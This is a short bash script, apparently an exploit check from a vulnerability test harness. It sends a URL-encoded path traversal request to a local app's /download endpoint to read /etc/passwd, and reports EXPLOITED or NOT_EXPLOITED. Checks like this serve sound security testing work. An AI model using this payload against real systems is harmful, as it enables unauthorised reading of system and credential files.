#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/download?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
if echo "$resp" | grep -q "root:"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
